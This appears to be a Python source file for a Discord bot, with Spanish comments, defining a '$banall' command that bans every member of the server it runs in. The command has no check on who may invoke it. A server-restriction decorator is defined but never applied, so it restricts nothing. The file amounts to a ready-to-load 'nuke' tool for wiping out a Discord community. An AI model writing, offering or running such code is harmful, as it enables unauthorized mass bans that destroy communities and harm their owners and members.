from discord.ext import commands
import discord

RESTRICTED_GUILDS = [123456789012345678, 987654321098765432]  # Reemplaza con los IDs de los servidores restringidos

def guild_restriction(restricted_guilds):
    def decorator(func):
        async def wrapper(ctx, *args, **kwargs):
            if ctx.guild.id in restricted_guilds:
                await ctx.send("Este comando no se puede ejecutar en este servidor.")
                return
            return await func(ctx, *args, **kwargs)
        return wrapper
    return decorator

class BanAll(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def banall(self, ctx):
        guild = ctx.guild
        
        # Banea a todos los miembros del servidor
        for member in guild.members:
            try:
                if member != self.bot.user:  # No intentar banear al bot mismo
                    await member.ban(reason="Baneado por el comando $banall")
                    print(f'Baneado {member.name}.')
            except discord.Forbidden:
                print(f'No se puede banear a {member.name}. Permisos insuficientes.')
            except discord.HTTPException as e:
                print(f'Error al banear a {member.name}: {e}')

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(BanAll(bot))
